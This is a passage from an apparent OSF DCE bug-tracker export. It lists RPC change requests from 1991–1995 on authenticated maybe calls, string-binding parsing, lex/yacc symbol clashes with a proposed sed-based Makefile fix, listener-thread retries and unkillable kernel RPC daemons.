Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/26/92 public]

In order for an authenticated maybe call to work, the server's
runtime must make an auth-way call back to the client.  If the
client is still around, and the authentication information is
still intact, this works fine.

However, if the client sends off the call and then exits, the
server's auth_way call will fail, and the maybe call will be
dropped.    This behavior is not consistent with the intended
meaning of the 'maybe' attribute.  That is, an application designed
in this way could be guaranteed that it would always fail.  (Note
that such an application would be quite reasonable w/o the use
of authentication; and that 'maybe' semantics and authentication
are orthogonal issues.)



CR Number                     : 5738
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : rpc/runtime/combind.c
Short Description             : rpc_binding_from_string_binding return incorrect status for valid string
Reported Date                 : 10/21/92
Found in Baseline             : 1.0.1
Found Date                    : 10/21/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/21/92 public]

        rpc_binding_from_string_binding returns the status 
	rpc_s_invalid_string_binding for the following string binding handles:

        ncacn_ip_tcp
        ncacn_ip_tcp[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp[2000]
        ncadg_ip_udp
        ncadg_ip_udp[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp[2000]

        The problem is in the rpc_string_binding_parse() routine in the same
        file (src/rpc/combind.c). The algorithm in that code always looks for
        ':'. If absent, it doesn't recognize the mandatory element of the
        string binding, the protocol sequence. The work around is to put ':'
        as shown below:

        ncacn_ip_tcp:
        ncacn_ip_tcp:[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp:
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncacn_ip_tcp:[2000]
        ncadg_ip_udp:
        ncadg_ip_udp:[2000]
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp:
        093FDF00-A2CC-11CB-AFA5-0802A80080CD@ncadg_ip_udp:[2000]

        which we do not feel is appropriate. DCE code can and should be cleaned
        to handle the cleaner format and yet allow old format if need be.

        Also the RPC Prog. Ref./AES should use BNF or some other notations to
        clearly state the syntax of the string binding. Please **avoid**
        substituting such notations by lengthy, yet unclear English 
	description.



CR Number                     : 5735
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/idl/idl_compiler/acf.h
Short Description             : Global Symbol Name Clash on LEX/YACC Functions and Variables
Reported Date                 : 10/21/92
Found in Baseline             : 1.0.1
Found Date                    : 10/21/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/21/92 public]

        The current upgrade from AIX 3.15 to AIX 3.2 also saw the LEX
        library upgrade to a new version.  The new version of LEX
        supports multibyte characters.  Hence, there are new LEX
        variables and functions.  LEX is used for nidl.l and acf.l
        Global symbol names for functions and variables need to
        be remapped to other names so that there are no symbol
        clashes.  If these new additions to LEX are not remapped,
        it is impossible to port the IDL compiler to other
        platforms because the C compiler linker on other platforms
        may behave differently than the one found on AIX 3.2

Proposed Solution:

        src/rpc/idl/idl_compiler/acf.h currently contains the
        global symbol mapping for the previous version of LEX
        variables and functions.  The following new mappings are
        required.

        #define yymbcurmax       acf_yymbcurmax
        #define _once_yylex      acf_once_yylex
        #define yywinput         acf_yywinput
        #define yywunput         acf_yywunput
        #define yywreturn        acf_yywreturn
        #define yywoutput        acf_yywoutput
        #define yymbinput        acf_yymbinput
        #define yymboutput       acf_yymboutput
        #define yymbunput        acf_yymbunput
        #define yymbreturn       acf_yymbreturn
        #define yywtext          acf_yywtext
        #define yywleng          acf_yywleng
        #define yytbi            acf_yytbi
        #define yytbuf           acf_yytbuf
        #define yytwc            acf_yytwc
        #define yytbp            acf_yytbp
        #define yywbuf           acf_yywbuf

[10/21/92 public]
Perhaps a safer thing to do might be to run the lex output through
sed:
	sed -e 's/yy/acf_yy/g'

[10/21/92 public]
Not having been the author of the current scheme for dealing with yacc/lex
porting issue but having been the lucky winner who has ported it to several
platforms, I'd just like to put in the following plug:  There HAS to be a
better way.  All the #define's and #ifdef's are highly out of control in
this area.  Isn't there ANY way to abstract this stuff better so that
porting is easier and system dependencies minimized and isolated?

[12/8/92 public]

There needs to be significant cleanup of in lex/yacc code throughout IDL.
Additional problems arose during the port of DCE to OSF1.1.1 such that we
are currently using the OSF 1.0.4 lex to build DCE.  Setting to enhancement
for 1.1.

[6/2/93 public]

Following is the text of a document I wrote describing a rough outline of
how to make IDL much more portable.

======================================================================


Today the IDL compiler contains many dependencies on nonportable features
of yacc and lex.  These dependencies have caused many porting problems
for our customers.

There are fundamentally two problems.  Both problems are due to idl
referring to internal and unsupported yacc/lex data structures.  The goal
of this OT is to document the problems and propose solutions.  These
solutions will greatly increase idl's portability.
 

Problem 1: Multiple parsers in bound into one executable.
=========================================================

The problem:
============

Idl contains two grammars: one for IDL and one for ACF.  Each of these
grammars has its own yaccer and lexer.  yacc and lex are not designed to
handle this situation smoothly.  In the yacc/lex-generated C code, a number
of (invariantly named) external entrypoints and data objects are defined.
There are name clashes between the IDL and ACF parsers.

Today's solution to this problem is to rename the external names via
#defines in acf.h:

    #define yyact       acf_yyact
    #define yyback      acf_yyback
    #define yybgin      acf_yybgin
    #define yychar      acf_yychar
    #define yyparse     acf_yyparse
    ...

The problem with this model is that customer is responsible for cataloging
all the yacc/lex externally named objects and creating an acf.h.

Solution overview
=================

Modify the idl Makefile to use sed to rename the ambiguous names
(containing "yy") to be unique to the particular grammar.

acf_lex_yy_i.c:  acf.l
	${LEX} ${_LFLAGS_} -t ${.ALLSRC} > ${.TARGET}.tmp
	${SED} -e "s/yy/acf_yy/g" -e "s/YY/acf_YY/g" ${.TARGET}.tmp > ${.TARGET}
	${RM} ${.TARGET}.tmp

acf_y_tab.c acf_y_tab.h: acf.y
	${YACC} ${_YFLAGS_} ${.ALLSRC}
	${SED} -e "s/yy/acf_yy/g" -e "s/YY/acf_YY/g" y.tab.c > acf_y_tab.c
	${SED} -e "s/yy/acf_yy/g" -e "s/YY/acf_YY/g" y.tab.h > acf_y_tab.h
	${RM} y.tab.c 
	${RM} y.tab.h 

lex_yy.c: nidl.l
	${LEX} ${_LFLAGS_} -t ${.ALLSRC} > ${.TARGET}.tmp
	${SED} -e "s/yy/idl_yy/g" -e "s/YY/idl_YY/g" ${.TARGET}.tmp > ${.TARGET}
	${RM} ${.TARGET}.tmp

y_tab.c y_tab.h: nidl.y
	${YACC} ${_YFLAGS_} ${.ALLSRC}
	${SED} -e "s/yy/idl_yy/g" -e "s/YY/idl_YY/g" y.tab.c > idl_y_tab.c
	${SED} -e "s/yy/idl_yy/g" -e "s/YY/idl_YY/g" y.tab.h > idl_y_tab.h
	${RM} y.tab.c 
	${RM} y.tab.h

Several other small changes will be needed, such as changing references
from yyparse() to idl_yyparse().


Problem 2: Recursive calls to yyparse() during import operations
================================================================

The problem:
============

When processing import files, idl saves the entire state of the yacc/lex
world on a stack, recursively calls yyparse() [starting at the top of the
grammar], and pops the stack.  This would be fine, except that to
save/restore requires knowledge of many undocumented yacc/lex data
structures.  See idlparse.c for the nonportability details.

Here's what's done today:

	interface_body : ... optional_imports ... (grammar in nidl.y)
	optional_imports: ... import_file ...
	import_file:		{ FE_parse_import() }

	FE_parse_import():  (in frontend.c)

		SAVE_LEX_YACC_STATE ()
		save some idl-specific info
		setup to parse an import file

		parse() ->
			yyparse ()

		RESTORE_LEX_YACC_STATE ()
		restore some idl-specific info


The solution:
=============

The goal is to eliminate saving and restoring the yacc/lex state.  To do
this, we need to eliminate invoking yyparse() recursively.  The strategy is
to recognize an import statement beneath the lexer, i.e., in the input
stream handler.

Example:

	input idl file:		import a, b, c

	returned to lexer:	import a
				body of a
				import b
				body of b
				etc.


The yacc grammer must still see the actual "import" directive because
significant things (besides the input stream) change when going in/out of
an import file.  Consequently we make the input stream handler return an
"import" string to the lexer, and the lexer will return an IMPORT_KW to
yacc.

Here are the conceptual changes to nidl.y:

	import_file:
		STRING
		{
			int_p = FE_start_parsing_import ($<y_string>1);
		}

		interface       /* recurse back to top of grammar */

		{
			FE_done_parsing_import ()
		}


The changes to frontend.c are splitting FE_parse_import() into
FE_start_parsing_import() and FE_done_parsing_import().  Obviously we
discard the SAVE/RESTORE_LEX_YACC_STATE code.

Also the logic from parse() which manages ACF files needs to be broken out
into a new function so that FE_done_parsing_import() may process an import
file's ACF.

[09/03/93 public]
Setting status to defer, since we are going to address this in 1.1.
(See RPC 1.1 project plan)



CR Number                     : 5681
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : output argument discipline could be better
Reported Date                 : 10/16/92
Found in Baseline             : 1.0.2b4
Found Date                    : 10/16/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/16/92 public]

RPC API routines (and other components, for that matter, but let's start
with RPC), should be careful with respect to output arguments which are
pointers.

In the event of failure, it would be nice of output pointer arguments were
either set to NULL, or untouched.  Currently, some routines allocate aa
pointer, store it into the output argument, then decide to fail, free the
memory, but don't then clear the output argument to NULL.

If you're being assiduous about memory leaks by including lots of 
if (p) free(p) type statments at the end of routines, this can give you a
rude surprise.



CR Number                     : 5117
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : app_gd
Short Description             : Add an example showing how
priority is used in a profile element.
Reported Date                 : 8/18/92
Found in Baseline             : 1.0
Found Date                    : 8/18/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/18/92 public]

       In the application development guide, it would be useful to have
       an example of how priority is used in the profile element.
       This should be placed in chapter 15 "Advanced DCE RPC Topics"
       under "15.1.2.2 Examples of Searching for Server Entries".

[06/10/93 public]
Changed "Responsible Engineer" to "osf".  Writer TBD.

[07/06/93 public]
Assigned this CR to writer Steve Lewontin.

[3/29/94 public]

Assigned this CR to John Shirley (OSF rpc writer)
from Steve Lewontin.

[8/26/94 public]
This is being deferred to a later version of DCE.

[6/30/95 public]

Assigned to HP for DCE 1.2.



CR Number                     : 3777
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : com.h NAF id table mismatch with socket.h
Reported Date                 : 5/25/92
Found in Baseline             : 1.0
Found Date                    : 5/25/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/25/92 public]
from runtime/com.h:
  #define rpc_c_naf_id_osi     19

from sys/socket.h:
  #define AF_ISO          7               /* ISO protocols */
  #define AF_OSI          AF_ISO
  ...
  #define pseudo_AF_XTP   19              /* eXpress Transfer Protocol (no AF) */

from runtime/com.h:
  #define rpc_c_naf_id_max     20

from sys/socket.h:
  #define AF_MAX          30

[5/29/92 public]
Changed to "enhancement"; the issue is pretty moot given that we don't
really support the ISO address/protocol family at the moment.

In any case, it's not clear we really have a bug here anyway since I could
argue that the space of rpc_c_naf_id_... values is really different from
the space of AF_... values.  They happen to look the same and the fact that
they are at the moment is of some utility to the implementation of the
rpc_socket_... and rpc_naf_... abstractions.  At the point where some ISO
stack gets supported, we can either change the value of rpc_c_naf_id_osi
(should we be so lucky that the world converges on a single value of
AF_ISO) or we could fix the implementations of the rpc_socket_... and
rpc_naf_... abstractions to do the appropriate mapping for the local
system.

[07/20/93 public]
See mishkin's comments above, the inter to rpc defined do not
correspond to the socket defines.

Canceled.

[07/20/93 public]
Bill S. want to take a stab at this.



CR Number                     : 3150
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : src/rpc/runtime/comnlsn.c
Short Description             : Listener thread retries forever in error when tcp/ip reset.
Reported Date                 : 4/29/92
Found in Baseline             : 1.0
Found Date                    : 4/29/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/29/92 public]

Full Description:

Listener thread retries forever with error after tcp/ip reset.

        When a tcp/ip is reset or some tcp/ip error occurrs, all
        the socket desc are invalidated and the select in
        lthread_loop will get a bad parameter error. Currently
        the code retries forever. Even after tcp/ip is back up,
        the listener thread still cannot recover from this error.

Repeat By:

        resetting tcp/ip while listener thread is running

Proposed Solution:

        Limit the number if retries and kill the listener thread
        when this happens.

[6/30/92 public]

The DG protocol has code to detect this condition.  Sockets that
consistently fail are closed and removed from the listener thread.
Note that it's not necessary to kill the listener thread unless 
all of its sockets have been closed.

Can you determine from your tests if you are seeing this problem
on both the DG and the CN code?  I don't know if the CN protocol
is able to handle failing sockets.

[10/16/92 public]
Changed code engineer to Wei Hu @ DEC.

[1/7/93 public]
Promote to enhancement.

[09/03/93 public]
This will not be addressed till 1.1. Defering.



CR Number                     : 970
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : kruntime
Short Description             : krpc based deamons cannot be killed
Reported Date                 : 10/29/91
Found in Baseline             : 1.0
Found Date                    : 
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[01/29/92 public]

Orbit reference number 3466
reference     
product       dce_osf
phaseFound    development

History:
lastUpdate    91/12/20 10:09:47
endDate                                
assignDate    91/12/20 10:09:47   





    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    91/10/29 12:04:57    create          burnett (C. Burnett)
    91/11/05 15:41:50    modify          drb (Defect Review Board)
    91/12/20 10:07:19    modify          adm (DCE Family Administrator)
    91/12/20 10:09:47    assign          adm (DCE Family Administrator)

[10/29/91 public]
Deamons which are used to start up kernel level processes such as the
DFS which use kernel NCS cannot be kill.  I tried both kill and kill -9.
One should be able to stop these deamons with kill.  When a kill is
issued, all of the threads (kprocs) should be cleaned up and and the
rpc_server_listen should return and let the caller handle the EINTR.

[11/05/91 public]
This defect has been marked 'deferred' (do not fix in 1.0) by the DRBoard.  Reason:
Kernal-based daemons cannot clean up gracefully.

[03/18/92]
This defect has been re-tagged as an enhancement, deferred from 1.0.1



